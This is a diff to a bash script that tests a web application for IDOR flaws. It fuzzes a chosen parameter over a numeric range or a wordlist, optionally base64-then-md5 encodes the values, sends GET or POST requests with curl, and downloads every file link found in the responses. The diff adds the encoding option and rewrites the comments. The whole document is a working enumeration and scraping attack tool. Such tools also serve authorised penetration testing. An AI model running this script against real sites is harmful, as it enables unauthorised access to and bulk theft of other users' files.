@@ -1,28 +1,31 @@
 #!/bin/bash
 
-# Define the base URL
+# **Define the base URL**
 echo "Please enter URL you want to test for IDOR"
 read url
 
-
-# Prompt the user to select the HTTP method
+# **Select HTTP Method**
 echo "Select HTTP method: GET or POST"
 read method
 
-# Prompt for the directory to search
+# **Directory to Search**
 echo "Enter directory to search (e.g., 'uploads', omit the forward slash '/'): "
 read directory
 
-# Prompt for the parameter to fuzz
+# **Parameter to Fuzz**
 echo "Enter parameter name to fuzz (e.g., 'uid', omit the equals '='): "
 read parameter
 
-# Convert method to uppercase for consistency
+# **Convert Method to Uppercase**
 method=${method^^}
 
-# Ask the user if they want to use a range or a file list
+# **Range or File List**
 echo "Do you want to use a range (R) or a file list (F)? Enter R or F:"
 read choice
+
+# **Encoding Option**
+echo "Do you want to encode parameter values? (Y/N)"
+read encode
 
 if [ "$choice" = "R" ] || [ "$choice" = "r" ]; then
     echo "Enter the start of the range:"
@@ -31,24 +34,27 @@ if [ "$choice" = "R" ] || [ "$choice" = "r" ]; then
     read end
 
     for i in $(seq $start $end); do
-        # Check the selected HTTP method
+        # **Encoding Check**
+        if [ "$encode" = "Y" ] || [ "$encode" = "y" ]; then
+            encoded_i=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
+            param_value=$encoded_i
+        else
+            param_value=$i
+        fi
+
+        # **HTTP Method Check**
         if [ "$method" == "GET" ]; then
-            # Use curl for GET request
-            response=$(curl -s "$url/$directory.php?$parameter=$i")
+            response=$(curl -s "$url/$directory.php?$parameter=$param_value")
         elif [ "$method" == "POST" ]; then
-            # Use curl for POST request
-            response=$(curl -s -X POST --data "$parameter=$i" "$url/$directory.php")
+            response=$(curl -s -X POST --data "$parameter=$param_value" "$url/$directory.php")
         else
             echo "Invalid HTTP method selected."
             exit 1
         fi
 
-        # Extract links from the response
+        # **Extract and Download Links**
         links=$(echo "$response" | grep -oP "/$directory.*?\.\w+")
-
-        # Download each link using curl
         for link in $links; do
-            # Form the complete URL
             complete_url="${url}${link}"
             echo "Downloading: $complete_url"
             curl -s -O "$complete_url"
@@ -61,24 +67,27 @@ elif [ "$choice" = "F" ] || [ "$choice" = "f" ]; then
 
     while IFS= read -r line; do
         i=$line
-        # Check the selected HTTP method
+        # **Encoding Check**
+        if [ "$encode" = "Y" ] || [ "$encode" = "y" ]; then
+            encoded_i=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
+            param_value=$encoded_i
+        else
+            param_value=$i
+        fi
+
+        # **HTTP Method Check**
         if [ "$method" == "GET" ]; then
-            # Use curl for GET request
-            response=$(curl -s "$url/$directory.php?$parameter=$i")
+            response=$(curl -s "$url/$directory.php?$parameter=$param_value")
         elif [ "$method" == "POST" ]; then
-            # Use curl for POST request
-            response=$(curl -s -X POST --data "$parameter=$i" "$url/$directory.php")
+            response=$(curl -s -X POST --data "$parameter=$param_value" "$url/$directory.php")
         else
             echo "Invalid HTTP method selected."
             exit 1
         fi
 
-        # Extract links from the response
+        # **Extract and Download Links**
         links=$(echo "$response" | grep -oP "/$directory.*?\.\w+")
-
-        # Download each link using curl
         for link in $links; do
-            # Form the complete URL
             complete_url="${url}${link}"
             echo "Downloading: $complete_url"
             curl -s -O "$complete_url"
@@ -89,3 +98,4 @@ else
     echo "Invalid choice. Exiting."
     exit 1
 fi
+
